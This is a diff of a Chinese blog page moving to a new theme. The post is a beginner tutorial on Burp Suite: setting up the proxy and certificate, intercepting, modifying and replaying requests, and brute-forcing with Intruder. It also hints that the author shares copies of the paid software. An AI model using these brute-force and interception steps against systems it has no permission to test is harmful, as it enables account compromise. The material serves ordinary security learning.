@@ -1,571 +1,189 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
-  <link rel="mask-icon" href="/images/tu.ico" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
-  </script>
-
-  <meta name="description" content="前言：&amp;emsp;Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多Burp工具，这些不同的burp工具通过协同工作，有效的分享信息，支持以某种工具中的信息为基础供另一种工具使用的方式发起攻击。就我现在而言它是必须用到的一款工具，主要用它来达到抓包、改包、重放攻击和爆破的目的，那么接下来我会着重讲讲怎么才能达到这些目的。   一、BurpSuite的安装&amp;emsp;因为它是基">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>burpsuit的基本使用 | 信安小蚂蚁</title><meta name="author" content="信安小蚂蚁"><meta name="copyright" content="信安小蚂蚁"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：&amp;emsp;Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多Burp工具，这些不同的burp工具通过协同工作，有效的分享信息，支持以某种工具中的信息为基础供另一种工具使用的方式发起攻击。就我现在而言它是必须用到的一款工具，主要用它来达到抓包、改包、重放攻击和爆破的目的，那么接下来我会着重讲讲怎么才能达到这些目的。   一、BurpSuite的安装&amp;emsp;因为它是基">
 <meta property="og:type" content="article">
 <meta property="og:title" content="burpsuit的基本使用">
 <meta property="og:url" content="https://mayi077.github.io/2020/01/12/burpsuit%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="信安小蚂蚁">
 <meta property="og:description" content="前言：&amp;emsp;Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多Burp工具，这些不同的burp工具通过协同工作，有效的分享信息，支持以某种工具中的信息为基础供另一种工具使用的方式发起攻击。就我现在而言它是必须用到的一款工具，主要用它来达到抓包、改包、重放攻击和爆破的目的，那么接下来我会着重讲讲怎么才能达到这些目的。   一、BurpSuite的安装&amp;emsp;因为它是基">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic.downk.cc/item/5e19db1b7f9a96fec191b379.jpg">
-<meta property="og:image" content="https://pic.downk.cc/item/5e19dc647f9a96fec191eaff.jpg">
-<meta property="og:image" content="https://pic.downk.cc/item/5e19deb77f9a96fec1924be8.jpg">
-<meta property="og:image" content="https://pic.downk.cc/item/5e19df857f9a96fec1926b62.jpg">
-<meta property="og:image" content="https://pic.downk.cc/item/5e1a8ba22fb38b8c3c1ebd2c.jpg">
-<meta property="og:image" content="https://pic.downk.cc/item/5e1a8d252fb38b8c3c1ee5f9.jpg">
-<meta property="og:image" content="https://pic.downk.cc/item/5e1a90872fb38b8c3c1f47df.jpg">
-<meta property="og:image" content="https://pic.downk.cc/item/5e1a92532fb38b8c3c1f7192.jpg">
-<meta property="og:image" content="https://i.loli.net/2020/01/12/AgHBmZ7Kiy3zb6O.png">
+<meta property="og:image" content="https://mayi077.github.io/images/1.jpg">
 <meta property="article:published_time" content="2020-01-12T04:16:05.000Z">
 <meta property="article:modified_time" content="2020-02-14T13:42:31.000Z">
 <meta property="article:author" content="信安小蚂蚁">
 <meta property="article:tag" content="基础积累">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://pic.downk.cc/item/5e19db1b7f9a96fec191b379.jpg">
-
-<link rel="canonical" href="https://mayi077.github.io/2020/01/12/burpsuit%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true
-  };
-</script>
-
-  <title>burpsuit的基本使用 | 信安小蚂蚁</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">信安小蚂蚁</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-  </div>
-
-  <div class="site-nav-right"></div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-主页">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
-
-  </li>
-        <li class="menu-item menu-item-归档">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
-
-  </li>
-        <li class="menu-item menu-item-分类">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-标签">
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-关于">
-
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-
-</nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="off"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
-  </div>
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
+<meta name="twitter:image" content="https://mayi077.github.io/images/1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "burpsuit的基本使用",
+  "url": "https://mayi077.github.io/2020/01/12/burpsuit%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/",
+  "image": "https://mayi077.github.io/images/1.jpg",
+  "datePublished": "2020-01-12T04:16:05.000Z",
+  "dateModified": "2020-02-14T13:42:31.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "信安小蚂蚁",
+      "url": "https://mayi077.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://mayi077.github.io/2020/01/12/burpsuit%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
       
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
   
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/01/12/burpsuit%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="信安小蚂蚁">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="信安小蚂蚁">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          burpsuit的基本使用
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-01-12 12:16:05" itemprop="dateCreated datePublished" datetime="2020-01-12T12:16:05+08:00">2020-01-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-14 21:42:31" itemprop="dateModified" datetime="2020-02-14T21:42:31+08:00">2020-02-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" itemprop="url" rel="index">
-                    <span itemprop="name">基础积累</span>
-                  </a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
       
-        <p>前言：<br>&emsp;Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多Burp工具，这些不同的burp工具通过协同工作，有效的分享信息，支持以某种工具中的信息为基础供另一种工具使用的方式发起攻击。就我现在而言它是必须用到的一款工具，主要用它来达到抓包、改包、重放攻击和爆破的目的，那么接下来我会着重讲讲怎么才能达到这些目的。  </p>
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'burpsuit的基本使用',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">信安小蚂蚁</span></a><a class="nav-page-title" href="/"><span class="site-name">burpsuit的基本使用</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">burpsuit的基本使用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-01-12T04:16:05.000Z" title="发表于 2020-01-12 12:16:05">2020-01-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-02-14T13:42:31.000Z" title="更新于 2020-02-14 21:42:31">2020-02-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/">基础积累</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>前言：<br>&emsp;Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多Burp工具，这些不同的burp工具通过协同工作，有效的分享信息，支持以某种工具中的信息为基础供另一种工具使用的方式发起攻击。就我现在而言它是必须用到的一款工具，主要用它来达到抓包、改包、重放攻击和爆破的目的，那么接下来我会着重讲讲怎么才能达到这些目的。  </p>
 <h3 id="一、BurpSuite的安装"><a href="#一、BurpSuite的安装" class="headerlink" title="一、BurpSuite的安装"></a>一、BurpSuite的安装</h3><p>&emsp;因为它是基于Java开发的所以安装burp会用到jdk，所以必须先配置好jdk , 下载安装自行百度。<br>&emsp;因为它是一款收费软件，所以软件资源需要自行寻找，当然可以直接联系我qq：487280636（请注明来意）</p>
 <ol>
-<li>这里我有一个打开burp suite非常方便的bat脚本文件如：<br><img data-src="https://pic.downk.cc/item/5e19db1b7f9a96fec191b379.jpg" alt=""><br>点击同意即可进入。</li>
-<li>如果没有这个bat的话那么我们按常规的来，直接打开得到：<br><img data-src="https://pic.downk.cc/item/5e19dc647f9a96fec191eaff.jpg" alt=""><br>我们按下一步，接着再下一步不用管。</li>
+<li>这里我有一个打开burp suite非常方便的bat脚本文件如：<br><img src="https://pic.downk.cc/item/5e19db1b7f9a96fec191b379.jpg" alt=""><br>点击同意即可进入。</li>
+<li>如果没有这个bat的话那么我们按常规的来，直接打开得到：<br><img src="https://pic.downk.cc/item/5e19dc647f9a96fec191eaff.jpg" alt=""><br>我们按下一步，接着再下一步不用管。</li>
 </ol>
 <p>经过上面的任意一种方法后都可成功安装（<strong>每次启动都要重复这些步骤</strong>）</p>
 <h3 id="二、Burp-Suite的基本配置"><a href="#二、Burp-Suite的基本配置" class="headerlink" title="二、Burp Suite的基本配置"></a>二、Burp Suite的基本配置</h3><ol>
-<li>配置 Burp suite 代理 ，打开burp 选择 proxy—–&gt;options记住这里的ip地址和端口号（一般默认都是127.0.0.1:8080）<br>然后去浏览器里将代理改为上述的ip及端口号可以使用代理插件FoxyProxy来轻松配置如下：<br><img data-src="https://pic.downk.cc/item/5e19deb77f9a96fec1924be8.jpg" alt=""><br>如果找不到这个插件那么我们还可以直接在浏览器设置代理以火狐为例:选项-&gt;网络设置栏里的设置改为（记得把不使用代理的文本输入框清空）：<br><img data-src="https://pic.downk.cc/item/5e19df857f9a96fec1926b62.jpg" alt="">  </li>
+<li>配置 Burp suite 代理 ，打开burp 选择 proxy—–&gt;options记住这里的ip地址和端口号（一般默认都是127.0.0.1:8080）<br>然后去浏览器里将代理改为上述的ip及端口号可以使用代理插件FoxyProxy来轻松配置如下：<br><img src="https://pic.downk.cc/item/5e19deb77f9a96fec1924be8.jpg" alt=""><br>如果找不到这个插件那么我们还可以直接在浏览器设置代理以火狐为例:选项-&gt;网络设置栏里的设置改为（记得把不使用代理的文本输入框清空）：<br><img src="https://pic.downk.cc/item/5e19df857f9a96fec1926b62.jpg" alt="">  </li>
 <li>安装SSL受信任证书  </li>
 </ol>
 <ul>
-<li>打开浏览器访问 <a href="http://burp" target="_blank" rel="noopener">http://burp</a> ，点击CA   Certificate  下载 证书或者在Burp Suite里直接下载证书Proxy-&gt; Options-&gt; CA certificate…进入后如图：<br><img data-src="https://pic.downk.cc/item/5e1a8ba22fb38b8c3c1ebd2c.jpg" alt=""><br>next后给证书选个位置并命名为1.der  </li>
-<li>进入浏览器，将证书导入，以火狐为例（进入选项，搜索证书，导入证书）：<br><img data-src="https://pic.downk.cc/item/5e1a8d252fb38b8c3c1ee5f9.jpg" alt=""><br>&emsp;<strong>这样就配置好了，现在可以开始抓包了。</strong>  </li>
+<li>打开浏览器访问 <a target="_blank" rel="noopener" href="http://burp">http://burp</a> ，点击CA   Certificate  下载 证书或者在Burp Suite里直接下载证书Proxy-&gt; Options-&gt; CA certificate…进入后如图：<br><img src="https://pic.downk.cc/item/5e1a8ba22fb38b8c3c1ebd2c.jpg" alt=""><br>next后给证书选个位置并命名为1.der  </li>
+<li>进入浏览器，将证书导入，以火狐为例（进入选项，搜索证书，导入证书）：<br><img src="https://pic.downk.cc/item/5e1a8d252fb38b8c3c1ee5f9.jpg" alt=""><br>&emsp;<strong>这样就配置好了，现在可以开始抓包了。</strong>  </li>
 </ul>
 <h3 id="三、BurpSuite-的基本使用"><a href="#三、BurpSuite-的基本使用" class="headerlink" title="三、BurpSuite 的基本使用"></a>三、BurpSuite 的基本使用</h3><p>&emsp;经过上面一系列操作以后我们可以进行抓包等一系列操作了。</p>
 <ol>
-<li><strong>抓包</strong>，只要Burp suite和浏览起按上面步骤来，此时你使用该浏览器打开网页时都会先发给burp suite 由它做最后的决定（增、改、丢、放）如图：<br><img data-src="https://pic.downk.cc/item/5e1a90872fb38b8c3c1f47df.jpg" alt="">  </li>
+<li><strong>抓包</strong>，只要Burp suite和浏览起按上面步骤来，此时你使用该浏览器打开网页时都会先发给burp suite 由它做最后的决定（增、改、丢、放）如图：<br><img src="https://pic.downk.cc/item/5e1a90872fb38b8c3c1f47df.jpg" alt="">  </li>
 <li><strong>改包</strong> ， 可以在刚刚收到的包里进行更改然后点击放行即可。</li>
-<li><strong>重放</strong> ， 在抓导报后 点击Action -&gt; send to repeater 再到repeater选项中进行对包的操作后，go即可得到想要的结果如：<br><img data-src="https://pic.downk.cc/item/5e1a92532fb38b8c3c1f7192.jpg" alt="">  </li>
-<li><strong>爆破</strong> ， burp suite中有一个专门的爆破的模块，在抓到包的界面单击action- &gt; send to Intruder 先到Intruder-&gt; Positions将需要爆破的值添加在$ $（类似这样）的中间，再到Intruder-&gt; payload进行调整如：<br><img data-src="https://i.loli.net/2020/01/12/AgHBmZ7Kiy3zb6O.png" alt="图片.png"><br>Intruder—— &gt; options 可以进行爆破的所使用的资源等配置（这里不细讲）<br>最后点击Intruder-&gt;start attack开始爆破，会弹出一个进度窗口可以进行查看结果。通过观察放回的不同结果来确定自己是否成功。  </li>
+<li><strong>重放</strong> ， 在抓导报后 点击Action -&gt; send to repeater 再到repeater选项中进行对包的操作后，go即可得到想要的结果如：<br><img src="https://pic.downk.cc/item/5e1a92532fb38b8c3c1f7192.jpg" alt="">  </li>
+<li><strong>爆破</strong> ， burp suite中有一个专门的爆破的模块，在抓到包的界面单击action- &gt; send to Intruder 先到Intruder-&gt; Positions将需要爆破的值添加在$ $（类似这样）的中间，再到Intruder-&gt; payload进行调整如：<br><img src="https://i.loli.net/2020/01/12/AgHBmZ7Kiy3zb6O.png" alt="图片.png"><br>Intruder—— &gt; options 可以进行爆破的所使用的资源等配置（这里不细讲）<br>最后点击Intruder-&gt;start attack开始爆破，会弹出一个进度窗口可以进行查看结果。通过观察放回的不同结果来确定自己是否成功。  </li>
 </ol>
 <p>&emsp;到这里基本上已经达到了我们的需求，先写到这里，后面可能会有补充。</p>
-
-    </div>
-
-    
-    
-    
-        
-
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>信安小蚂蚁
-  </li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    <a href="https://mayi077.github.io/2020/01/12/burpsuit%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" title="burpsuit的基本使用">https://mayi077.github.io/2020/01/12/burpsuit的基本使用/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
-
-     <div>
-       
-         ﻿<div>
-    
-        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
-    
-</div>
-         
-      </div>
-
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" rel="tag"><i class="fa fa-tag"></i>基础积累</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2020/01/11/hexo-%E7%A0%81%E4%BA%91%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" rel="prev" title="hexo+码云搭建个人博客">
-      <i class="fa fa-chevron-left"></i> hexo+码云搭建个人博客
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/01/13/web-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" rel="next" title="web--随便注">
-      web--随便注 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-  </div>
-
-
-          </div>
-          
-    <div class="comments" id="gitalk-container"></div>
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let activeClass = CONFIG.comments.activeClass;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、BurpSuite的安装"><span class="nav-number">1.</span> <span class="nav-text">一、BurpSuite的安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、Burp-Suite的基本配置"><span class="nav-number">2.</span> <span class="nav-text">二、Burp Suite的基本配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、BurpSuite-的基本使用"><span class="nav-number">3.</span> <span class="nav-text">三、BurpSuite 的基本使用</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
-      src="/images/1.jpg">
-  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives">
-          <span class="site-state-item-count">135</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-        <span class="site-state-item-count">11</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-        <span class="site-state-item-count">86</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-      </span>
-      <span class="links-of-author-item">
